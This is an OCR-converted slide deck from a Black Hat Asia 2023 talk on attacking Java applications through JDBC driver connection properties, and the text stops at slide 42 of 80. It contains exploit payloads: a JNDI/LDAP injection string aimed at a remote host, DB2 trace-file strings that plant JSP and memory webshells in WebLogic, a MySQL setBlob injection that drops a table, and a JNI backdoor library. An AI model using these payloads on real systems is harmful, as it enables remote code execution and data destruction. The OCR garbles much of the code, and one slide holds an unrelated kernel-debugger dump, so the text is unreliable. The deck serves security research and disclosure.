---
title: "A new attack interface in Java"
speakers: ["Yuanzhen"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2023"
edition: "ASIA"
year: 2023
source_pdf: "Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf"
pages: 80
sha256: "b4399795a643547329953d519df98715a926199d773d339ecb015bb8323a1903"
text_chars: 52109
ocr_pages: 44
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.0
ocr_unreliable_blocks: 0
vision_verified_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T03:53:25Z"
---
# A new attack interface in Java

**Speakers:** Yuanzhen  
**Conference:** Black Hat ASIA 2023  
**Source:** `Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf` (80 pages)


## Slide 1

# A New Attack Interface In Java Applications

Xu Yuanzhen

#### Peter Mularien

#BHASIA   @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ASIA &
MAY 11-12
BRIEFINGS
A New Attack Interface In Java Applications
Xu Yuanzhen
Peter Mularien
#BHASIA @BlackHatEvents
```

## Slide 2

Abused Connection Resource Arbitrary Log File Writing

Lexical Syntax Compatibility

Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 3

Abused Connection Resource Arbitrary Log File Writing Lexical Syntax Compatibility Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 4

## Leverage JNDI  to Connect JDBC Data Source

JNDI Tree Connection Pool
Data Source Connection
JDBC Driver
Client Data Source Connection Database
Connection
Data Source

## Slide 5

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

SQLH_TYPE=LDAP LDAP_URL=ldap://host-name:port-number LDAP_IFXBASE=Informix-base-DN LDAP_USER=user LDAP_PASSWD=password

JNDI Injection

## Slide 6

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

**JNDI Injection Remote Code  Execution Is NOT Trigged**


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
DriverManager.registerDriver (new com.informix.jdbc.IfxDriver
DriverManager.getConnection("jdbc:informix-sqli:informixserver=ser ;user=user ; password=password ; SQLH_TYPE=LDAP
; LDAP_URL=ldap://remote.i1p:389/;LDAP_IFXBASE=Evi LObject"
G JNDI Injection Remote Code Execution Is Trigged
```

## Slide 7

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
try t{
SearchControls constraints = new SearchControls() ;
constraints.setSearchScope (LDAP_SCOPEO) ;
"
String lbase = "cn=" + sname + "," + this. ldap_sqhDn;
NamingEnumeration<SearchResult> results = this.sqhctx.search(lbase,
LDAP_FILTER, constraints) ;
if (results != null && results.hasMore()) 4{
SearchrResult si = (SearchResult) results.next() ;
Attributes attrs = si.getAttributes() ;
10 NamingEnumeration<? extends Attribute> ae = attrs.getAlLl();
```

## Slide 8

14 15

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
10
12
13
14
15
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
public NamingEnumeration<SearchResult> search(Name varl, String var2, SearchControls var3)
NamingException
PartialCompositeDirContext var4 this;
Hashtable var5 = this.p_getEnvironment() ;
Continuation var6 = new Continuation(varl, vars);
Name var8& = varl;
NamingEnumeration var/;
try 4
for(var? = var4.p_search(var8, var2, var3, var6); var6.isContinue(); var7 =
var4.p_search(var8, var2, var3, varé)) {
var8 = var6.getRemainingName () ;
getPCDirContext(var6) ;
thre
OWS
```

## Slide 9

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 protected NamingEnumeration<SearchResult> p_search(Name varl, String var2,
2 SearchControls var3, Continuation var4) throws NamingException {
3 @ HeadTail var5 = this.p_resolveIntermediate(varl, var4);
4 NamingEnumeration var6é = null;
5 switch (var5S.getStatus()) {
6 case 2:
7 var6 = this.c_search(var5.getHead(), var2, var3, var4);
8 break;
9 case 3:
10 var6 = this.c_search_nns(var5.getHead(), var2, var3, var4) ;
11 }
```

## Slide 10

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection


> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 HeadTail p_resolveIntermediate(Name varl, Continuation var2) rows NamingException {
2 > var3 1;
3 var2.setSuccess();
4 HeadTail var4 11S.p_parseComponent(varl, var2);
5 Name var5 var4.getTail();
6 Name var6 var4.getHead () ;
7 if (var5 ! ULL && !var5.isEmpty()) {
8 eo) Object var7;
9 if (!var5.get(0).equals("")) {
13 var2.setContinue(var/, var6, iS, var5);
14 } else if (var2.isContinue()) {
16 var2.appendRemainingName(var5) ;
17
18
```

## Slide 11

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection


> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 protected Object c_resolveIntermediate_nns(Name varl, Continuation var2) throws NamingException {
2 tr)
3 ) Final Object var3 = this.c_lookup(varl, var2);
4 if (var3 != null && this.getClass().isInstance(var3) )
5 var2.setContinueNNS(var3, varl, this);
6 eturn null;
7 t else if (var3 != null && !(var3 instanceof Context)) {
8 RefAddr var4 new RefAddr ("nns")
9 private static final long serialVersionUID = -8831204798861786362L;
10
ll public Object getContent() {
12 return var3;
13 f
15 Reference var5 = new Reference("java. lang.Object", varA4) ;
16 CompositeName var6 (CompositeName) varl.clone() ;
17 var6.add("") ;
18 var2.setContinue(var5, var6, this);
19 eturn null;
```

## Slide 12

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

- Trigger a JNDI lookup

search
p_search
p_resolveIntermediate
c_lookup
javax.naming.InitialContext#lookup(java.lang.String)
Stack Trace
com.sun.jndi.url.ldap.ldapURLContext#lookup(java.lang.String)
com.sun.jndi.toolkit.url.GenericURLContext#lookup(java.lang.String)
com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup(javax.naming.Name)
com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup
com.sun.jndi.ldap.LdapCtx#c_lookup

## Slide 13

Abused Connection Resource

### Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class Incorrect Response Disposal

JDBC Attack Protection

## Slide 14

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

- traceFile

   - With the property, the user can specify the name of a file into which the IBM Data Server Driver for JDBC and SQLJ write trace information.

- traceLevel

- traceFileAppend

## Slide 15

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

• Backdoor Webshell in Weblogic Server

JSP Tag


> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
* Backdoor Webshell in Weblogic Server
JSP Tag
=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
© Could not establish a connection because of java.lang.IIlegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: "Ru"<br/>weblogic.jdbc.common. internal. DataSourceUtil.testConnection0(DataSourceUtil.java:426)
<br/>weblogic.jdbc.common.internal. DataSourceUtil.access$000(DataSourceUtil.java:24)<br/>weblogic.jdbc.common. internal. DataSourceUtil$1.run(DataSourceUtil.java:288)<br/>java.security.AccessController.doPrivileged(Native Method)
<br/>com.bea.console.actions.jdbc.datasources.createjdbcdatasource.CreateJDBCDataSource.testConnectionConfiguration(CreateJDBCDataSource.java:511)<br/>sun.reflect.GeneratedMethodAccessor1084.invoke(Unknown Source)
<br/>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br/>java.lang.reflect.Method.invoke(Method.java:498)<br/>org.apache. beehive.netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870)
<br/>org.apache. beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809)<br/>org.apache.beehive.netui.pageflow.FlowController.internalExecute(FlowController.java:478)
<br/>org.apache. beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306)<br/>org.apache.beehive.netui.pageflow.FlowController.execute(FlowController.java:336)
<br/>org.apache. beehive.netui.pageflow.internal.FlowControllerAction.execute(FlowControllerAction.java:52)<br/>org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431)
<br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor.access$201(PageFlowRequestProcessor.java:97)<br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute(PageFlowRequestProcessor.java:2044)
```

## Slide 16

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

• Backdoor Webshell in Weblogic Server

- Servlet version 2.3 or earlier than 2.3 then EL expression are disabled by default

- Weblogic Server 14c supports the Servlet 4.0

- Use EL expression to evade the URL decoder exception

**<%.getRuntime().exec("open -a calculator")}; %>Runtime ${Runtime.getRuntime().exec("open -a calculator")}**

## Slide 17

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### • Backdoor Webshell in Weblogic Server


> Recovered by OCR — confidence 78/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
Backdoor Webshell in Weblogic Server
DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver ()) ;
DriverManager.getConnection("jdbc:db2://127.0.0.1:5001/test: password=${pageContext.setAttribute("classLoader"
r")) ;pageContext.setAttribute("managementService",
eContext.getAttribute("httpDataTransferHandler") .getDeclaredField("KERNE_ID") ) ;pageContext. getAttribute ("KERN
E_ID").setAccessible(true) ;pageContext.setAttribute("getPropertyService",managementService. getMethod("getProp
ertyService", pageContext. getAttribute("authenticatedSubject"))) ;pageContext.getAttribute("getPropertyService"
).setAccessible(true) ;pageContext.setAttribute("prop", pageContext.getAttribute("getPropertyService") .invoke(n
ttribute("getTimestamp2",propertyService.getMethod("getTimestamp2") ) ;pageContext. getAttribute("getTimestamp2"
).setAccessible(true) ;pageContext.setAttribute("username",
pageContext.getAttribute("getTimestamp1") .invoke(pageContext.getAttribute("prop"))) ;pageContext.setAttri bute (
evel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
```

## Slide 18

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### • Backdoor Webshell in Weblogic Server


> Recovered by OCR — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
¢ Backdoor Webshell in Weblogic Server
Cc i) 127.0.0.1
user.dir=/Users/pyn3rd/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain, line.separator=\n, java.vm.name=Java HotSpot(TM) 64-Bit Server VM,
javax.management.builder.initial=weblogic.management.jmx.mbeanserver.WLSMBeanServerBuilder, file.encoding=UTF-8, org.omg.CORBA.ORBClass=weblogic.corba.orb.ORB, java.specification.version=1 .8, launch.use.env.classpath=true } [ibm][db2]
[jcc] Dumping all file properties: { } [ibm][db2][jec] END TRACE_DRIVER_CONFIGURATION [ibm][db2][jec] BEGIN TRACE_CONNECTS [ibm][db2][jcc] Attempting connection to 127.0.0.1:5001/test [ibm][db2][jcc] Using properties: {
url=jdbc:db2://127.0.0.1:5001/test:password=weblogic/pynerd@ 123 ;traceFileAppend=true;traceLevel=- | ;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;,
pageContext.setAttribute("httpDataTransferHandler" pageContext.getAttribute("classLoader").loadClass("weblogic.deploy.service datatransferhandlers.HttpDataTransferHandler"));pageContext.setAttribute("managementService",
pageContext.getAttribute("classLoader").loadClass("weblogic.management.provider.ManagementService" ));pageContext.setAttribute("authenticatedSubject" pageContext.getAttribute("classLoader").loadClass("weblogic.security.acl.internal.AuthenticatedSu
username=db2 } [ibm][db2][jcc] END TRACE_CONNECTS [ibm][db2][jcc] BEGIN TRACE_DIAGNOSTICS [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036]
java.sql.SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@5bdb 1036] SQL state = null [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue:
‘weblogic.kernel.Default (self-tuning)'][SQLException @ Sbdb 1036] Error code = -99999 [ibm][db2][jcc][Thread:[ ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036] Message = [ibm][db2][jcc]
[10333][11649] No license was found. An appropriate license file db2jcc_license_*.jar must be provided in the CLASSPATH setting. [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)']
[SQLException @5bdb1036] Stack trace follows com.ibm.db2.jcc.c.SqlException: [ibm][db2][jcc][10333][ 11649] No license was found. An appropriate license file db2jcc_license_*.jar must be provided in the CLASSPATH setting. at
com.ibm.db2.jcc.c.o.d(0.java:534) at com.ibm.db2.jcc.c.p.a(p.java:332) at com.ibm.db2.jcc.c.p.(p.java:404) at com.ibm.db2.jcc.b.b.(b.java:256) at com.ibm.db2.jcc. DB2Driver.connect(DB2Driver.java: 163) at
weblogic.jdbc.common.internal.DataSourceUtil.testConnection0(DataSourceUtil .java:373) at weblogic.jdbc.common.internal.DataSourceUtil .access$000(DataSourceUtil .java:24) at
weblogic.jdbc.common. internal .DataSourceUtil$1 .run(DataSourceUtil.java:287) at java.security. AccessController.doPrivileged(Native Method) at weblogic.jdbc.common.internal.DataSourceUtil testConnection(DataSourceUtil java:284) at
sun.reflect.GeneratedMethodAccessor803 .invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpI.java:43) at java.lang.reflect. Method .invoke(Method.java:497) at
org.apache.bechive .netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870) at org.apache.beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809) at
org.apache.bechive .netui.pageflow.FlowController.internalExecute(FlowController.java:478) at org.apache.beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306) at
org.apache.bechive .netui.pageflow.FlowController.execute(FlowController.java:336) at org.apache.beehive.netui.pageflow.internal FlowControllerAction.execute(FlowControllerAction.java:52) at
org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431) at org.apache.beehive.netui.pageflow.PageFlowRequestProcessor.access$20 | (PageFlowRequestProcessor.java:97) at
org.apache.beehive .netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute(PageFlowRequestProcessor.java:2044) at
org.apache.beehive .netui.pageflow.interceptor.action internal ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors.java:64) at
org.apache.bechive .netui.pageflow.interceptor.action.ActionInterceptor.wrapAction(ActionInterceptor.java: 184) at
org.apache.beehive .netui.pageflow.interceptor.action internal .ActionInterceptors$WrapActionInterceptorChain.invoke(ActionInterceptors.java:50) at
org.apache.bechive .netui.pageflow.interceptor.action internal .ActionInterceptors.wrapAction(ActionInterceptors.java:87) at org.apache.beehive.netui.pageflow.PageFlowRequestProcessor.processActionPerform(PageFlowRequestProcessor.java:2116) at
com.bea.console.internal.ConsolePageFlowRequestProcessor.processActionPerform(ConsolePageFlowRequestProcessor.java:275) at org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:237) at
org.apache.bechive .netui.pageflow.PageFlowRequestProcessor.processInternal(PageFlowRequestProcessor.java:556) at org .apache.bechive.netui.pageflow.PageFlowRequestProcessor.process(PageFlowRequestProcessor.java:853) at
org.apache.bechive .netui.pageflow.AutoRegisterActionServlet.process(AutoRegisterActionServlet.java:631) at org.apache.bechive.netui.pageflow.PageFlowActionServlet.process(PageFlowActionServlet.java: 158) at
com.bea.console.internal.ConsoleActionServlet.process(ConsoleActionServlet.java:266) at org.apache.struts.action.ActionServlet.doGet(ActionServlet.java:416) at com.bea.console.internal.ConsoleActionServlet.doGet(ConsoleActionServlet.java:135) at
```

## Slide 19

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

#### How to Inject an Indiscoverable Memory Webshell into Weblogic Server?

## Slide 20

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### **Acquire Weblogic Server request object with current thread**

**Utilize malicious class to implement new filter register**

**inject  bytecode of malicious class with BCEL**

## Slide 21

**BCEL Code Transformer**

###### **WeblogicMemFilter**


> Recovered by OCR — confidence 80/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ylLic cla BCELTransfer {
blic static void main(String[] args) throws Exception{
String code = Utility.encode(cls.getBytes(), true); [_BCEL Code Transformer )
Class<?> aClass = new ClassLoader ().loadClass("S$$BCEL$$"+code) ;
aClass.newInstance() ;
; WeblogicMemFilter {
atic {
String filterName = "dynamicFilter1";
String urlPattern nx":
String FILTER_CLASS_STRING = <STRINGS>;
Thread thread = Thread.currentThread() ;
Field workEntry
thread. getContextClassLoader () . loadClass("weblogic.work.ExecuteThread") .getDeclaredField("
workEntry.setAccessible(true) ;
Object workentry = workEntry.get(thread) ;
workEntry") ;
Field connectionHandler = Berens gasolelsel0 ). getDeclaredField("connectionHandler") ;
connectionHandler.setAccessible(true) ;
requestl.setAccessible(true) ;
Object servletRequest requestl.get(http) ;
Field context serv lLetRequest. getClass() .getDeclaredField("context")
context.setAccessible(true) ;
contextField.setAccessible(true) ;
Object filterManager = contextrield. get (webAppServletcontext)
```

## Slide 22


> Recovered by OCR — confidence 70/100 on the text kept, 37/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Se6se3sff$DSccp$f1i$T$L$iSA$sA') .newInstance() }; traceFi leAppend=false; traceLevel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/memshell. jsp;
```

## Slide 23


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
CI TOCTOU: Code Execution

Break instruction exception - code 80000003 (first chance)
0033:00007fff`addb1550 cc                  int     3
5: kd> db @rip
00007fff`addb1550  cc 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
00007fff`addb1560  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
00007fff`addb1570  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
00007fff`addb1580  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
00007fff`addb1590  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
00007fff`addb15a0  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
00007fff`addb15b0  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
00007fff`addb15c0  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
5: kd> dx @$curprocess->Name
@$curprocess->Name : services.exe
    Length           : 0xc
5: kd> dx @$curprocess->KernelObject->Protection
@$curprocess->KernelObject->Protection                [Type: _PS_PROTECTION]
    [+0x000] Level            : 0x61 [Type: unsigned char]
    [+0x000 ( 2: 0)] Type             : 0x1 [Type: unsigned char]
    [+0x000 ( 3: 3)] Audit            : 0x0 [Type: unsigned char]
    [+0x000 ( 7: 4)] Signer           : 0x6 [Type: unsigned char]
```

## Slide 24

Abused Connection Resource Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class Incorrect Response Disposal

JDBC Attack Protection

## Slide 25

## MySQL JDBC Driver SQL Injection via setBlob Method

- A BLOB is a binary large object that can hold a variable amount of data

- BLOB values are treated as binary strings (byte strings)

- MySQL JDBC driver uses PreparedStatement.setBlob()

## Slide 26

## MySQL JDBC Driver SQL Injection via setBlob Method

• PreparedStatement.setBlob()


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
10
11
12
13
14
15
MySQL JDBC Driver SQL Injection via setBlob Method
@Override
public void setBlob(int parameterIndex, InputStream inputStream) throws SQLException {
synchronized (checkClosed().getConnectionMutex()) {
((PreparedQuery<?>)
}
@Override
public void setBlob(int parameterIndex, InputStream inputStream, long Length) throws SQLException
synchronized (checkClosed().getConnectionMutex()) {
((PreparedQuery<?>)
this.query) .getQueryBindings() .setBlob(getCoreParameterIndex(parameterIndex) , inputStream,
length) ;
at
```

## Slide 27

## MySQL JDBC Driver SQL Injection via setBlob Method

•


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MySQL JDBC Driver SQL Injection via setBlob Method
characterEncoding = gbk
ASCII Oct Hex
39 Ox27
\ 92 Ohaste
```

## Slide 28

## MySQL JDBC Driver SQL Injection via setBlob Method

- PreparedStatement.setBlob()

o append a couple of single quotes( ) surrounding blob data o escape the single quotes  in blob data with backslash (\) 轡 )   ;   d  r   o   p  t  a  b  l  e  t 1  ;  # de 27 29 3b 64 72 6f 70 20 74 61 62 6c 65 20 74 31 3b 23 27 轡 )  ;  d  r  o  p  t  a  b  l  e  t 1  ;  #   \ 27 de 5 c 27 29 3b 64 72 6f 70 20 74 61 62 6c 65 20 74 31 3b 23 5c 27 27

＂ INSERT INTO t1 ( size,data ) VALUES (20,_ binary       \  ); drop table t1;#\ 轡 ＂

## Slide 29

## MySQL JDBC Driver SQL Injection via setBlob Method

Dabase Server
Master MySQL Slave MySQL
Payload

1


> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MySQL JDBC Driver SQL Injection via setBlob Method
f Dabase Server |
Payload Master MySQL Slave MySQL
Connection conn =
DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/test?user=root&password=pynerd123&useUnicode=true&ch
aracterEncoding=gbk&al LowMultiQueries=true") ;
PreparedStatement ps = conn.prepareStatement ("INSERT INTO tl (size, data) VALUES(?,?)");
File file = new File("/Users/pyn3rd/exp.jpg") ;
FileInputStream fis = new FileInputStream(fi le) ;
ps.setBlob(2, fis);
ps.execute() ;
fis.close();
```

## Slide 30

MySQL JDBC Driver SQL Injection via setBlob Method


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
import java.io.x;
import java.sql.*;
MySQL JDBC Driver SQL Injection via setBlob Method
> public class MySQLJdbcDemo {
public static void main(String[] args) throws ClassNotFoundException, SQLException, IOException {
Connection conn = DriverManager .getConnection( url: "jdbc:mysql://127.0.0.1:3306/test ?>user=root&password=pynerd123&useUnicode=true&characterEncoding=gbk&al LowMuLtiQueries=true") ;
PreparedStatement ps = conn.prepareStatement( sql: "INSERT INTO t1 (size, data) VALUES (?,?)");
File file =
FileInputStream fis = new FileInputStream(file) ;
ps.setInt( parameterindex: 1, (int) file.length());
ps.setBlob( parameterindex: 2, fis);
ps.execute();
fis.close();
| MySQLJdbcDemo
new File( pathname: "/Users/pyn3rd/Downloads/jdbc-test/exp.jpg") ;
/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/bin/java
Exception in thread
at
at
at
at
at
com.
com
com
com
com
-mysql.
cj.
cj.
"main"
jdbc.
jdbc.
jdbc.
jdbc.
java.sql.SQLSyntaxErrorException Create breakpoint : Table 'test.t1' doesn't exist
exceptions.SQLError.createSQLException(SQLError.java:120)
exceptions.SQLExceptionsNapping. transLateException(SQLExceptionsMapping. java:122)
ClientPreparedStatement.execute(ClientPreparedStatement.java:370)
```

## Slide 31

Abused Connection Resource

Arbitrary Log File Writing

Lexical Syntax Compatibility

Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 32

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- pluginClassName

**Getter and Setter**


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
1 public synchronized void setPluginClassName (String paramString)
2 this.pluginClassName = paramString;
3
4
5 public String getPluginClassName() {|
6 return this.pluginClassName; | Getter and Setter |
8
9 public static String getPluginClassName(Properties paramProperties)
10 O return paramProperties.getProperty ("pluginClassName") ;
12
```

## Slide 33

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

• No Argument Constructor


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
* No Argument Constructor
import javax.naming.NamingException;
public class EvilObject {
public EvilObject () throws NamingException, IOException {
J
```

## Slide 34

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- No Argument Constructor

**Thoughts Class**

## Slide 35

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class


> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
import java.sql.DriverMaonager ;
15 usages
> public class DB2JCCDemo {
b public static void main(String[] args) throws Exception { eee
DriverManager.getConnection( url: "jdbc:db2://127.0.0.1:5001/testdb:pluginClassName=com.example.EvilObject;"); Fi 8 fe)
o
Run: DB2JCCDemo
at com.ibm.db2.jcc.DB2Driver.connect( Driver.java:117)
it at com.example.jdbc.attack.db2.DB2JCCDemo.main(DB2JCCDemo. java:13)
= Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DE
- 11 more
Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14226][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
at com.ibm.db2.jcc.am.b7.a(b7. java:116)
13 more
Process finished with exit code 1
```

## Slide 36

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

Try to find a No Argument Constructor in the real-world scenario

## Slide 37

## JNI (Java Native Interface)

###### • System.loadLibrary method to revoke the libraries from various platforms

JVM File
JNI
Windows JVM .dll
Source Code Byte Code Linux JVM .so
.dylib
MacOS JVM

## Slide 38

com.sun.security.auth.module.UnixSystem


> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
com.sun.security.auth.module.UnixSystem
@jdk.Exported
public class UnixSystem
private native void getUnixInfo() ;
protected String username;
protected long uid;
cted long gid;
ected longl] groups;
10
2 x Instantiate code>UnixSystem</code id load
3 « the tive Ui t e the underlying tem informati¢
15 public UnixSystem()
16 O System. LoadLibrary ("jaas_unix") ;
17 getUnixInfo() ;
18 }
```

## Slide 39

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- Hijack the Java library jaas_unix (Java Authentication and Authorization Service)

- com.sun.security.auth.module.UnixSystem (Linux )

   - Public Constructor

- com.sun.security.auth.module.NTSystem  (Windows)

**java.library.path**

/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/jre/lib

libjaas_unix.dylib

## Slide 40

JNI Backdoor for Command Execution

##### **libjaas_unix.dylib**


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
JNI Backdoor for Command Execution
#include <stdli
#include <string>
#include
ce std;
using
jint JNI_OnLoad(JavaVMx vm, void* reserved) {
JNIEnv* env;
vm->AttachCurrentThread((void*x*x)&env, NULL);
jclass system_clazz = env—>FindClass("java/lang/System") ;
jmethodID get_property_method = env->GetStaticMethodID(system_clazz,
if (get_property_method == NULL) {
return JNI_VERSION_1_2;
jboolean jsCopy;
const charx cmd = env->GetStringUTFChars (env->NewStringUTF ("open
std::string ee;
system(ee.c_str());
return JNI_VERSION_1_2;
or"), &jsCopy) ;
```

## Slide 41

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- Remote Code Execution with JNI


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
¢ Remote Code Execution with JNI
DriverManager.registerDriver com.ibm.db2.jcc.DB2Driver
System;"
```

## Slide 42

IBM DB2 JCC Driver Remote Code Execution via Unchecked Class


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
public class DB2JCCDemo {
public static void main(String[] args) throws Exception {
// Register Driver
